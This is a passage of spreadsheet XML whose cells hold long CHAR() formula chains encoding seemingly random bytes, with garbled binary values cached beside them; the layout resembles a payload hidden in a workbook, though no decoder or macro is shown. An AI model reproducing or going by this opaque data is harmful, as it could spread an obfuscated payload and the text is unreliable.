        <v>&gt;"„,um¿H_x0006__x0014_V=Ô½_x000E_˜ _x0012_ŠeâÁh3AãÛ7B_x0019__x000D_G5x_x001B_f£`ÁÄ%,í'_x0010_ö_x0007_ÅÐñèª#Õ_x0017_U7j«è5‡_x000D__x0001_Þ‘dP½ävÙr&gt;Ë&lt;-=ŒU¶Ž¥_x001E_†±ì#KŸœqSñp ‰"ÈÜ_x0008__x0006_áE/TŠm˜ÅýÙ}2¯_x000D_Zc_x001D_î4ÁÞg_x001F_Á.FË_x001F_RðÊ%©ÅÙ_x0013_Žs_x000E_üF!ßÑ&lt;'3WL@Ü¬_x0013_MãÑ²_x0001_¨_x000D_ïM!pøœb§ò¹¯è‰Êj_x0006_­Š_x0011__x0002_ˆ3ô ]Z|QTº_x0007_ER_x0017__x0001_l­h³Àb†øÀ_x000B_ÅU`_x0013_Ø«2îu_x0013_ØzÅ€]ý²mÐŒ?éô_x000D_ë}x9‹_x001C__x0005_öIÞúŠ™Ÿöñ‡_x0012_</v>
      </c>
      <c r="C42" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(127)&amp;CHAR(78)&amp;CHAR(43)&amp;CHAR(235)&amp;CHAR(163)&amp;CHAR(122)&amp;CHAR(232)</f>
        <v>÷ýôN+ë£zè</v>
      </c>
    </row>
    <row r="43" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B43" t="str">
        <f>CHAR(168)&amp;CHAR(117)&amp;CHAR(62)&amp;CHAR(176)&amp;CHAR(193)&amp;CHAR(24)&amp;CHAR(84)&amp;CHAR(162)&amp;CHAR(21)&amp;CHAR(98)&amp;CHAR(76)&amp;CHAR(153)&amp;CHAR(222)&amp;CHAR(181)&amp;CHAR(166)&amp;CHAR(132)&amp;CHAR(254)&amp;CHAR(127)&amp;CHAR(183)&amp;CHAR(31)&amp;CHAR(44)&amp;CHAR(14)&amp;CHAR(181)&amp;CHAR(63)&amp;CHAR(38)&amp;CHAR(101)&amp;CHAR(65)&amp;CHAR(127)&amp;CHAR(66)&amp;CHAR(162)&amp;CHAR(175)&amp;CHAR(140)&amp;CHAR(32)&amp;CHAR(127)&amp;CHAR(36)&amp;CHAR(28)&amp;CHAR(103)&amp;CHAR(106)&amp;CHAR(126)&amp;CHAR(67)&amp;CHAR(214)&amp;CHAR(175)&amp;CHAR(148)&amp;CHAR(117)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(177)&amp;CHAR(48)&amp;CHAR(210)&amp;CHAR(38)&amp;CHAR(88)&amp;CHAR(135)&amp;CHAR(38)&amp;CHAR(237)&amp;CHAR(59)&amp;CHAR(111)&amp;CHAR(35)&amp;CHAR(141)&amp;CHAR(76)&amp;CHAR(243)&amp;CHAR(115)&amp;CHAR(27)&amp;CHAR(251)&amp;CHAR(32)&amp;CHAR(182)&amp;CHAR(68)&amp;CHAR(206)&amp;CHAR(6)&amp;CHAR(69)&amp;CHAR(238)&amp;CHAR(49)&amp;CHAR(73)&amp;CHAR(211)&amp;CHAR(234)&amp;CHAR(28)&amp;CHAR(24)&amp;CHAR(124)&amp;CHAR(183)&amp;CHAR(248)&amp;CHAR(33)&amp;CHAR(168)&amp;CHAR(36)&amp;CHAR(1)&amp;CHAR(37)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(123)&amp;CHAR(160)&amp;CHAR(2)&amp;CHAR(57)&amp;CHAR(234)&amp;CHAR(88)&amp;CHAR(107)&amp;CHAR(67)&amp;CHAR(194)&amp;CHAR(118)&amp;CHAR(248)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(165)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(229)&amp;CHAR(222)&amp;CHAR(129)&amp;CHAR(93)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(113)&amp;CHAR(83)&amp;CHAR(159)&amp;CHAR(161)&amp;CHAR(36)&amp;CHAR(210)&amp;CHAR(145)&amp;CHAR(55)&amp;CHAR(174)&amp;CHAR(114)&amp;CHAR(97)&amp;CHAR(36)&amp;CHAR(222)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(211)&amp;CHAR(125)&amp;CHAR(241)&amp;CHAR(96)&amp;CHAR(74)&amp;CHAR(112)&amp;CHAR(59)&amp;CHAR(109)&amp;CHAR(65)&amp;CHAR(208)&amp;CHAR(46)&amp;CHAR(251)&amp;CHAR(193)&amp;CHAR(65)&amp;CHAR(91)&amp;CHAR(50)&amp;CHAR(154)&amp;CHAR(16)&amp;CHAR(117)&amp;CHAR(230)&amp;CHAR(177)&amp;CHAR(195)&amp;CHAR(43)&amp;CHAR(169)&amp;CHAR(83)&amp;CHAR(57)&amp;CHAR(92)&amp;CHAR(131)&amp;CHAR(113)&amp;CHAR(128)&amp;CHAR(209)&amp;CHAR(80)&amp;CHAR(79)&amp;CHAR(156)&amp;CHAR(101)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(98)&amp;CHAR(6)&amp;CHAR(249)&amp;CHAR(97)&amp;CHAR(121)&amp;CHAR(124)&amp;CHAR(44)&amp;CHAR(115)&amp;CHAR(234)&amp;CHAR(209)&amp;CHAR(41)&amp;CHAR(82)&amp;CHAR(239)&amp;CHAR(75)&amp;CHAR(30)&amp;CHAR(27)&amp;CHAR(91)&amp;CHAR(223)&amp;CHAR(233)&amp;CHAR(70)&amp;CHAR(193)&amp;CHAR(17)&amp;CHAR(248)&amp;CHAR(50)&amp;CHAR(230)&amp;CHAR(205)&amp;CHAR(219)&amp;CHAR(246)&amp;CHAR(51)&amp;CHAR(209)&amp;CHAR(63)&amp;CHAR(213)&amp;CHAR(143)&amp;CHAR(216)&amp;CHAR(167)&amp;CHAR(250)&amp;CHAR(214)&amp;CHAR(93)&amp;CHAR(104)&amp;CHAR(217)&amp;CHAR(159)&amp;CHAR(122)&amp;CHAR(144)&amp;CHAR(99)&amp;CHAR(161)&amp;CHAR(140)&amp;CHAR(227)&amp;CHAR(122)&amp;CHAR(78)&amp;CHAR(245)&amp;CHAR(250)&amp;CHAR(136)&amp;CHAR(96)&amp;CHAR(149)&amp;CHAR(227)&amp;CHAR(228)&amp;CHAR(244)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(162)&amp;CHAR(169)&amp;CHAR(143)&amp;CHAR(55)&amp;CHAR(163)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(219)&amp;CHAR(85)&amp;CHAR(159)&amp;CHAR(104)&amp;CHAR(231)&amp;CHAR(66)&amp;CHAR(108)&amp;CHAR(150)&amp;CHAR(92)&amp;CHAR(63)&amp;CHAR(119)&amp;CHAR(230)&amp;CHAR(84)&amp;CHAR(119)&amp;CHAR(238)&amp;CHAR(60)&amp;CHAR(130)&amp;CHAR(144)&amp;CHAR(233)&amp;CHAR(186)&amp;CHAR(182)&amp;CHAR(114)&amp;CHAR(64)&amp;CHAR(244)&amp;CHAR(147)&amp;CHAR(67)&amp;CHAR(236)&amp;CHAR(238)</f>
        <v>¨u&gt;°Á_x0018_T¢_x0015_bL™Þµ¦„þ·_x001F_,_x000E_µ?&amp;eAB¢¯Œ $_x001C_gj~CÖ¯”u:Ê±0Ò&amp;X‡&amp;í;o#Lós_x001B_û ¶DÎ_x0006_Eî1IÓê_x001C__x0018_|·ø!¨$_x0001_%-_x0016_{ _x0002_9êXkCÂvøŒA¥O1åÞ]V!qSŸ¡$Ò‘7®ra$Þ_x000D_Ó}ñ`Jp;mAÐ.ûÁA[2š_x0010_uæ±Ã+©S9\ƒq€ÑPOœe†Éb_x0006_ùay|,sêÑ)RïK_x001E__x001B_[ßéFÁ_x0011_ø2æÍÛö3Ñ?ÕØ§úÖ]hÙŸzc¡ŒãzNõúˆ`•ãäôë»¢©7£Í_x0007_ŒÛUŸhçBl–\?wæTwî&lt;‚éº¶r@ô“Cìî</v>
      </c>
      <c r="C43" t="str">
        <f>CHAR(225)&amp;CHAR(51)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(102)&amp;CHAR(250)&amp;CHAR(3)&amp;CHAR(240)&amp;CHAR(54)</f>
        <v>á3Íëófú_x0003_ð6</v>
      </c>
    </row>
    <row r="44" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B44" t="str">
        <f>CHAR(120)&amp;CHAR(190)&amp;CHAR(35)&amp;CHAR(161)&amp;CHAR(165)&amp;CHAR(81)&amp;CHAR(79)&amp;CHAR(247)&amp;CHAR(21)&amp;CHAR(95)&amp;CHAR(15)&amp;CHAR(52)&amp;CHAR(132)&amp;CHAR(187)&amp;CHAR(158)&amp;CHAR(56)&amp;CHAR(62)&amp;CHAR(184)&amp;CHAR(153)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(182)&amp;CHAR(235)&amp;CHAR(15)&amp;CHAR(70)&amp;CHAR(154)&amp;CHAR(27)&amp;CHAR(108)&amp;CHAR(206)&amp;CHAR(111)&amp;CHAR(160)&amp;CHAR(181)&amp;CHAR(80)&amp;CHAR(170)&amp;CHAR(255)&amp;CHAR(28)&amp;CHAR(221)&amp;CHAR(55)&amp;CHAR(22)&amp;CHAR(148)&amp;CHAR(24)&amp;CHAR(9)&amp;CHAR(71)&amp;CHAR(138)&amp;CHAR(25)&amp;CHAR(110)&amp;CHAR(29)&amp;CHAR(3)&amp;CHAR(126)&amp;CHAR(219)&amp;CHAR(126)&amp;CHAR(210)&amp;CHAR(102)&amp;CHAR(43)&amp;CHAR(223)&amp;CHAR(148)&amp;CHAR(156)&amp;CHAR(167)&amp;CHAR(133)&amp;CHAR(164)&amp;CHAR(73)&amp;CHAR(234)&amp;CHAR(97)&amp;CHAR(40)&amp;CHAR(206)&amp;CHAR(158)&amp;CHAR(242)&amp;CHAR(216)&amp;CHAR(142)&amp;CHAR(185)&amp;CHAR(244)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(143)&amp;CHAR(216)&amp;CHAR(66)&amp;CHAR(9)&amp;CHAR(141)&amp;CHAR(239)&amp;CHAR(208)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(83)&amp;CHAR(229)&amp;CHAR(37)&amp;CHAR(10)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(51)&amp;CHAR(220)&amp;CHAR(215)&amp;CHAR(49)&amp;CHAR(148)&amp;CHAR(136)&amp;CHAR(60)&amp;CHAR(246)&amp;CHAR(73)&amp;CHAR(234)&amp;CHAR(26)&amp;CHAR(211)&amp;CHAR(241)&amp;CHAR(41)&amp;CHAR(16)&amp;CHAR(25)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(191)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(23)&amp;CHAR(72)&amp;CHAR(77)&amp;CHAR(146)&amp;CHAR(124)&amp;CHAR(37)&amp;CHAR(128)&amp;CHAR(166)&amp;CHAR(170)&amp;CHAR(122)&amp;CHAR(237)&amp;CHAR(212)&amp;CHAR(238)&amp;CHAR(114)&amp;CHAR(163)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(101)&amp;CHAR(219)&amp;CHAR(163)&amp;CHAR(74)&amp;CHAR(46)&amp;CHAR(197)&amp;CHAR(41)&amp;CHAR(199)&amp;CHAR(244)&amp;CHAR(59)&amp;CHAR(144)&amp;CHAR(87)&amp;CHAR(163)&amp;CHAR(63)&amp;CHAR(72)&amp;CHAR(130)&amp;CHAR(167)&amp;CHAR(141)&amp;CHAR(49)&amp;CHAR(22)&amp;CHAR(221)&amp;CHAR(248)&amp;CHAR(165)&amp;CHAR(155)&amp;CHAR(220)&amp;CHAR(209)&amp;CHAR(240)&amp;CHAR(84)&amp;CHAR(163)&amp;CHAR(99)&amp;CHAR(254)&amp;CHAR(52)&amp;CHAR(39)&amp;CHAR(178)&amp;CHAR(171)&amp;CHAR(225)&amp;CHAR(159)&amp;CHAR(10)&amp;CHAR(107)&amp;CHAR(111)&amp;CHAR(145)&amp;CHAR(255)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(173)&amp;CHAR(108)&amp;CHAR(202)&amp;CHAR(223)&amp;CHAR(24)&amp;CHAR(38)&amp;CHAR(40)&amp;CHAR(169)&amp;CHAR(17)&amp;CHAR(16)&amp;CHAR(247)&amp;CHAR(84)&amp;CHAR(154)&amp;CHAR(104)&amp;CHAR(15)&amp;CHAR(86)&amp;CHAR(181)&amp;CHAR(192)&amp;CHAR(140)&amp;CHAR(118)&amp;CHAR(75)&amp;CHAR(242)&amp;CHAR(102)&amp;CHAR(21)&amp;CHAR(82)&amp;CHAR(129)&amp;CHAR(54)&amp;CHAR(65)&amp;CHAR(81)&amp;CHAR(103)&amp;CHAR(248)&amp;CHAR(170)&amp;CHAR(141)&amp;CHAR(62)&amp;CHAR(230)&amp;CHAR(242)&amp;CHAR(91)&amp;CHAR(196)&amp;CHAR(145)&amp;CHAR(94)&amp;CHAR(176)&amp;CHAR(39)&amp;CHAR(31)&amp;CHAR(82)&amp;CHAR(53)&amp;CHAR(62)&amp;CHAR(57)&amp;CHAR(247)&amp;CHAR(49)&amp;CHAR(188)&amp;CHAR(197)&amp;CHAR(98)&amp;CHAR(198)&amp;CHAR(24)&amp;CHAR(217)&amp;CHAR(162)&amp;CHAR(226)&amp;CHAR(136)&amp;CHAR(53)&amp;CHAR(20)&amp;CHAR(99)&amp;CHAR(195)&amp;CHAR(103)&amp;CHAR(168)&amp;CHAR(233)&amp;CHAR(33)&amp;CHAR(240)&amp;CHAR(168)&amp;CHAR(244)&amp;CHAR(105)&amp;CHAR(147)&amp;CHAR(57)&amp;CHAR(53)&amp;CHAR(117)&amp;CHAR(31)&amp;CHAR(202)&amp;CHAR(21)&amp;CHAR(124)&amp;CHAR(161)&amp;CHAR(77)&amp;CHAR(167)&amp;CHAR(78)&amp;CHAR(119)&amp;CHAR(216)</f>
        <v>x¾#¡¥QO÷_x0015___x000F_4„»ž8&gt;¸™ŸU¶ë_x000F_Fš_x001B_lÎo µPªÿ_x001C_Ý7_x0016_”_x0018_	GŠ_x0019_n_x001D__x0003_~Û~Òf+ß”œ§…¤Iêa(ÎžòØŽ¹ô÷ýØB	ïÐvŽSå%
˜¼_x0001_3Ü×1”ˆ&lt;öIê_x001A_Óñ)_x0010__x0019__x0006__x000B_¿9Â_x0017_HM’|%€¦ªzíÔîr£µÖeÛ£J.Å)Çô;W£?H‚§1_x0016_Ýø¥›ÜÑðT£cþ4'²«áŸ
ko‘ÿ_x000D_­lÊß_x0018_&amp;(©_x0011__x0010_÷Tšh_x000F_VµÀŒvKòf_x0015_R6AQgøª&gt;æò[Ä‘^°'_x001F_R5&gt;9÷1¼ÅbÆ_x0018_Ù¢âˆ5_x0014_cÃg¨é!ð¨ôi“95u_x001F_Ê_x0015_|¡M§NwØ</v>
      </c>
      <c r="C44" t="str">
        <f>CHAR(205)&amp;CHAR(142)&amp;CHAR(243)&amp;CHAR(96)&amp;CHAR(195)&amp;CHAR(216)&amp;CHAR(220)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>ÍŽó`ÃØÜ6Íë</v>
      </c>
    </row>
    <row r="45" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B45" t="str">
        <f>CHAR(172)&amp;CHAR(30)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(118)&amp;CHAR(138)&amp;CHAR(156)&amp;CHAR(101)&amp;CHAR(155)&amp;CHAR(246)&amp;CHAR(163)&amp;CHAR(146)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(59)&amp;CHAR(236)&amp;CHAR(164)&amp;CHAR(194)&amp;CHAR(48)&amp;CHAR(165)&amp;CHAR(205)&amp;CHAR(61)&amp;CHAR(53)&amp;CHAR(55)&amp;CHAR(111)&amp;CHAR(71)&amp;CHAR(152)&amp;CHAR(214)&amp;CHAR(179)&amp;CHAR(47)&amp;CHAR(37)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(154)&amp;CHAR(24)&amp;CHAR(52)&amp;CHAR(185)&amp;CHAR(183)&amp;CHAR(53)&amp;CHAR(26)&amp;CHAR(101)&amp;CHAR(151)&amp;CHAR(72)&amp;CHAR(162)&amp;CHAR(218)&amp;CHAR(121)&amp;CHAR(10)&amp;CHAR(75)&amp;CHAR(213)&amp;CHAR(103)&amp;CHAR(252)&amp;CHAR(123)&amp;CHAR(114)&amp;CHAR(166)&amp;CHAR(19)&amp;CHAR(29)&amp;CHAR(235)&amp;CHAR(140)&amp;CHAR(5)&amp;CHAR(251)&amp;CHAR(219)&amp;CHAR(18)&amp;CHAR(30)&amp;CHAR(20)&amp;CHAR(100)&amp;CHAR(73)&amp;CHAR(14)&amp;CHAR(137)&amp;CHAR(23)&amp;CHAR(82)&amp;CHAR(173)&amp;CHAR(178)&amp;CHAR(219)&amp;CHAR(55)&amp;CHAR(173)&amp;CHAR(13)&amp;CHAR(96)&amp;CHAR(247)&amp;CHAR(158)&amp;CHAR(6)&amp;CHAR(164)&amp;CHAR(97)&amp;CHAR(211)&amp;CHAR(217)&amp;CHAR(213)&amp;CHAR(65)&amp;CHAR(128)&amp;CHAR(39)&amp;CHAR(167)&amp;CHAR(23)&amp;CHAR(54)&amp;CHAR(198)&amp;CHAR(24)&amp;CHAR(237)&amp;CHAR(71)&amp;CHAR(96)&amp;CHAR(223)&amp;CHAR(38)&amp;CHAR(77)&amp;CHAR(180)&amp;CHAR(196)&amp;CHAR(67)&amp;CHAR(15)&amp;CHAR(204)&amp;CHAR(58)&amp;CHAR(134)&amp;CHAR(109)&amp;CHAR(157)&amp;CHAR(67)&amp;CHAR(202)&amp;CHAR(55)&amp;CHAR(95)&amp;CHAR(78)&amp;CHAR(61)&amp;CHAR(97)&amp;CHAR(10)&amp;CHAR(37)&amp;CHAR(178)&amp;CHAR(112)&amp;CHAR(18)&amp;CHAR(23)&amp;CHAR(57)&amp;CHAR(174)&amp;CHAR(6)&amp;CHAR(241)&amp;CHAR(164)&amp;CHAR(161)&amp;CHAR(13)&amp;CHAR(52)&amp;CHAR(28)&amp;CHAR(178)&amp;CHAR(12)&amp;CHAR(141)&amp;CHAR(48)&amp;CHAR(136)&amp;CHAR(13)&amp;CHAR(135)&amp;CHAR(87)&amp;CHAR(134)&amp;CHAR(85)&amp;CHAR(230)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(26)&amp;CHAR(22)&amp;CHAR(91)&amp;CHAR(89)&amp;CHAR(114)&amp;CHAR(88)&amp;CHAR(77)&amp;CHAR(75)&amp;CHAR(44)&amp;CHAR(196)&amp;CHAR(61)&amp;CHAR(94)&amp;CHAR(103)&amp;CHAR(73)&amp;CHAR(118)&amp;CHAR(53)&amp;CHAR(55)&amp;CHAR(31)&amp;CHAR(55)&amp;CHAR(43)&amp;CHAR(74)&amp;CHAR(82)&amp;CHAR(156)&amp;CHAR(209)&amp;CHAR(110)&amp;CHAR(102)&amp;CHAR(238)&amp;CHAR(163)&amp;CHAR(59)&amp;CHAR(192)&amp;CHAR(31)&amp;CHAR(224)&amp;CHAR(250)&amp;CHAR(19)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(168)&amp;CHAR(226)&amp;CHAR(59)&amp;CHAR(85)&amp;CHAR(52)&amp;CHAR(186)&amp;CHAR(17)&amp;CHAR(153)&amp;CHAR(129)&amp;CHAR(44)&amp;CHAR(150)&amp;CHAR(114)&amp;CHAR(232)&amp;CHAR(155)&amp;CHAR(166)&amp;CHAR(63)&amp;CHAR(132)&amp;CHAR(22)&amp;CHAR(31)&amp;CHAR(47)&amp;CHAR(226)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(58)&amp;CHAR(56)&amp;CHAR(252)&amp;CHAR(196)&amp;CHAR(94)&amp;CHAR(180)&amp;CHAR(30)&amp;CHAR(31)&amp;CHAR(164)&amp;CHAR(94)&amp;CHAR(115)&amp;CHAR(248)&amp;CHAR(73)&amp;CHAR(129)&amp;CHAR(105)&amp;CHAR(239)&amp;CHAR(219)&amp;CHAR(223)&amp;CHAR(103)&amp;CHAR(242)&amp;CHAR(120)&amp;CHAR(47)&amp;CHAR(222)&amp;CHAR(51)&amp;CHAR(75)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(56)&amp;CHAR(80)&amp;CHAR(28)&amp;CHAR(164)&amp;CHAR(120)&amp;CHAR(52)&amp;CHAR(11)&amp;CHAR(240)&amp;CHAR(172)&amp;CHAR(102)&amp;CHAR(11)&amp;CHAR(95)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(73)&amp;CHAR(19)&amp;CHAR(153)&amp;CHAR(55)&amp;CHAR(196)&amp;CHAR(18)&amp;CHAR(158)&amp;CHAR(160)&amp;CHAR(172)&amp;CHAR(126)&amp;CHAR(106)&amp;CHAR(118)</f>
        <v>¬_x001E__x0001_ŽvŠœe›ö£’Wç;ì¤Â0¥Í=57oG˜Ö³/%_x0007_.š_x0018_4¹·5_x001A_e—H¢Úy
KÕgü{r¦_x0013__x001D_ëŒ_x0005_ûÛ_x0012__x001E__x0014_dI_x000E_‰_x0017_R­²Û7­_x000D_`÷ž_x0006_¤aÓÙÕA€'§_x0017_6Æ_x0018_íG`ß&amp;M´ÄC_x000F_Ì:†mCÊ7_N=a
%²p_x0012__x0017_9®_x0006_ñ¤¡_x000D_4_x001C_²_x000C_0ˆ_x000D_‡W†Uæ.‚_x001A__x0016_[YrXMK,Ä=^gIv57_x001F_7+JRœÑnfî£;À_x001F_àú_x0013_f¨â;U4º_x0011_™,–rè›¦?„_x0016__x001F_/âýµ:8üÄ^´_x001E__x001F_¤^søIiïÛßgòx/Þ3KÈ°8P_x001C_¤x4_x000B_ð¬f_x000B__bÔI_x0013_™7Ä_x0012_ž ¬~jv</v>
      </c>
      <c r="C45" t="str">
        <f>CHAR(68)&amp;CHAR(189)&amp;CHAR(215)&amp;CHAR(120)&amp;CHAR(52)&amp;CHAR(57)&amp;CHAR(72)&amp;CHAR(149)&amp;CHAR(184)&amp;CHAR(235)</f>
        <v>D½×x49H•¸ë</v>
      </c>
    </row>
    <row r="46" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B46" t="str">
        <f>CHAR(187)&amp;CHAR(149)&amp;CHAR(184)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(76)&amp;CHAR(109)&amp;CHAR(188)&amp;CHAR(75)&amp;CHAR(167)&amp;CHAR(254)&amp;CHAR(56)&amp;CHAR(229)&amp;CHAR(220)&amp;CHAR(116)&amp;CHAR(33)&amp;CHAR(202)&amp;CHAR(180)&amp;CHAR(212)&amp;CHAR(56)&amp;CHAR(248)&amp;CHAR(202)&amp;CHAR(197)&amp;CHAR(37)&amp;CHAR(139)&amp;CHAR(207)&amp;CHAR(170)&amp;CHAR(187)&amp;CHAR(198)&amp;CHAR(40)&amp;CHAR(186)&amp;CHAR(191)&amp;CHAR(87)&amp;CHAR(108)&amp;CHAR(144)&amp;CHAR(157)&amp;CHAR(238)&amp;CHAR(243)&amp;CHAR(11)&amp;CHAR(179)&amp;CHAR(222)&amp;CHAR(27)&amp;CHAR(171)&amp;CHAR(17)&amp;CHAR(233)&amp;CHAR(236)&amp;CHAR(127)&amp;CHAR(237)&amp;CHAR(166)&amp;CHAR(22)&amp;CHAR(218)&amp;CHAR(176)&amp;CHAR(203)&amp;CHAR(106)&amp;CHAR(66)&amp;CHAR(151)&amp;CHAR(181)&amp;CHAR(29)&amp;CHAR(138)&amp;CHAR(91)&amp;CHAR(176)&amp;CHAR(41)&amp;CHAR(11)&amp;CHAR(243)&amp;CHAR(96)&amp;CHAR(28)&amp;CHAR(194)&amp;CHAR(46)&amp;CHAR(47)&amp;CHAR(175)&amp;CHAR(145)&amp;CHAR(171)&amp;CHAR(115)&amp;CHAR(232)&amp;CHAR(149)&amp;CHAR(102)&amp;CHAR(134)&amp;CHAR(121)&amp;CHAR(62)&amp;CHAR(162)&amp;CHAR(76)&amp;CHAR(116)&amp;CHAR(20)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(189)&amp;CHAR(14)&amp;CHAR(89)&amp;CHAR(236)&amp;CHAR(110)&amp;CHAR(19)&amp;CHAR(73)&amp;CHAR(57)&amp;CHAR(165)&amp;CHAR(22)&amp;CHAR(78)&amp;CHAR(209)&amp;CHAR(73)&amp;CHAR(93)&amp;CHAR(174)&amp;CHAR(102)&amp;CHAR(211)&amp;CHAR(112)&amp;CHAR(18)&amp;CHAR(227)&amp;CHAR(163)&amp;CHAR(136)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(210)&amp;CHAR(249)&amp;CHAR(32)&amp;CHAR(116)&amp;CHAR(13)&amp;CHAR(246)&amp;CHAR(212)&amp;CHAR(58)&amp;CHAR(209)&amp;CHAR(204)&amp;CHAR(18)&amp;CHAR(84)&amp;CHAR(175)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(100)&amp;CHAR(83)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(216)&amp;CHAR(177)&amp;CHAR(143)&amp;CHAR(217)&amp;CHAR(254)&amp;CHAR(225)&amp;CHAR(205)&amp;CHAR(201)&amp;CHAR(102)&amp;CHAR(55)&amp;CHAR(125)&amp;CHAR(155)&amp;CHAR(177)&amp;CHAR(117)&amp;CHAR(112)&amp;CHAR(105)&amp;CHAR(108)&amp;CHAR(42)&amp;CHAR(207)&amp;CHAR(39)&amp;CHAR(224)&amp;CHAR(234)&amp;CHAR(224)&amp;CHAR(124)&amp;CHAR(78)&amp;CHAR(54)&amp;CHAR(178)&amp;CHAR(14)&amp;CHAR(150)&amp;CHAR(190)&amp;CHAR(131)&amp;CHAR(156)&amp;CHAR(181)&amp;CHAR(117)&amp;CHAR(23)&amp;CHAR(185)&amp;CHAR(95)&amp;CHAR(222)&amp;CHAR(184)&amp;CHAR(40)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(168)&amp;CHAR(28)&amp;CHAR(84)&amp;CHAR(66)&amp;CHAR(112)&amp;CHAR(41)&amp;CHAR(184)&amp;CHAR(242)&amp;CHAR(14)&amp;CHAR(96)&amp;CHAR(57)&amp;CHAR(159)&amp;CHAR(221)&amp;CHAR(26)&amp;CHAR(3)&amp;CHAR(242)&amp;CHAR(166)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(140)&amp;CHAR(202)&amp;CHAR(68)&amp;CHAR(13)&amp;CHAR(160)&amp;CHAR(131)&amp;CHAR(19)&amp;CHAR(239)&amp;CHAR(226)&amp;CHAR(234)&amp;CHAR(221)&amp;CHAR(80)&amp;CHAR(241)&amp;CHAR(35)&amp;CHAR(141)&amp;CHAR(244)&amp;CHAR(191)&amp;CHAR(45)&amp;CHAR(187)&amp;CHAR(138)&amp;CHAR(56)&amp;CHAR(92)&amp;CHAR(191)&amp;CHAR(87)&amp;CHAR(79)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(130)&amp;CHAR(166)&amp;CHAR(156)&amp;CHAR(98)&amp;CHAR(7)&amp;CHAR(103)&amp;CHAR(167)&amp;CHAR(46)&amp;CHAR(213)&amp;CHAR(4)&amp;CHAR(134)&amp;CHAR(42)&amp;CHAR(18)&amp;CHAR(242)&amp;CHAR(217)&amp;CHAR(251)&amp;CHAR(150)&amp;CHAR(241)&amp;CHAR(174)&amp;CHAR(97)&amp;CHAR(130)&amp;CHAR(123)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(162)&amp;CHAR(235)&amp;CHAR(59)&amp;CHAR(89)&amp;CHAR(238)&amp;CHAR(199)&amp;CHAR(48)&amp;CHAR(6)&amp;CHAR(43)&amp;CHAR(191)&amp;CHAR(34)&amp;CHAR(28)&amp;CHAR(128)&amp;CHAR(128)&amp;CHAR(189)</f>
        <v>»•¸‚ïLm¼K§þ8åÜt!Ê´Ô8øÊÅ%‹Ïª»Æ(º¿Wlîó_x000B_³Þ_x001B_«_x0011_éìí¦_x0016_Ú°ËjB—µ_x001D_Š[°)_x000B_ó`_x001C_Â./¯‘«sè•f†y&gt;¢Lt_x0014__x000E_½_x000E_Yìn_x0013_I9¥_x0016_NÑI]®fÓp_x0012_ã£ˆ_x001D_QÒù t_x000D_öÔ:ÑÌ_x0012_T¯Z]dSþTØ±ÙþáÍÉf7}›±upil*Ï'àêà|N6²_x000E_–¾ƒœµu_x0017_¹_Þ¸(†_x0003_¨_x001C_TBp)¸ò_x000E_`9ŸÝ_x001A__x0003_ò¦slŒÊD_x000D_ ƒ_x0013_ïâêÝPñ#ô¿-»Š8\¿WOï‰‚¦œb_x0007_g§.Õ_x0004_†*_x0012_òÙû–ñ®a‚{Rô¢ë;YîÇ0_x0006_+¿"_x001C_€€½</v>
      </c>
      <c r="C46" t="str">
        <f>CHAR(247)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(189)&amp;CHAR(201)&amp;CHAR(206)&amp;CHAR(147)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷˜¼½ÉÎ“ë÷ý</v>
      </c>
    </row>
    <row r="47" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B47" t="str">
